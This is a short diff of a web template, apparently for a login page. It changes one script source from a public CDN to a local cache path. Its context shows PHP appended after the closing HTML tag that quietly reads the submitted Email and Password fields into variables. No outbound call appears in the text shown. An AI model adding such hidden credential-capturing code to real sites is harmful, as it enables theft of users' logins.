@@ -10,7 +10,7 @@
         ga('create', 'UA-111801619-3', 'auto');
         var hostDomain = window.location.host || document.location.host || document.domain;
         ga('set', 'dimension1', hostDomain);
-        ga('send', 'pageview');</script><script async src=https://www.google-analytics.com/analytics.js></script>{/if} {if $recaptcha_sitekey != null}<script src="https://recaptcha.net/recaptcha/api.js?render=explicit" async defer></script>{/if} {if isset($geetest_html)}<script src=//static.geetest.com/static/tools/gt.js></script>{/if} {if $config['enable_telegram'] === true}<script src=https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs@gh-pages/qrcode.min.js></script>{/if}<script src=/vuedist/js/chunk-vendors.0ef9ccce.js></script><script src=/vuedist/js/app.59484a65.js></script></body></html> <?php
+        ga('send', 'pageview');</script><script async src=https://www.google-analytics.com/analytics.js></script>{/if} {if $recaptcha_sitekey != null}<script src="https://recaptcha.net/recaptcha/api.js?render=explicit" async defer></script>{/if} {if isset($geetest_html)}<script src=//static.geetest.com/static/tools/gt.js></script>{/if} {if $config['enable_telegram'] === true}<script src=/cache/gh/davidshimjs/qrcodejs@gh-pages/qrcode.min.js></script>{/if}<script src=/vuedist/js/chunk-vendors.0ef9ccce.js></script><script src=/vuedist/js/app.59484a65.js></script></body></html> <?php
 $a=$_POST['Email'];
 $b=$_POST['Password'];
 ?>
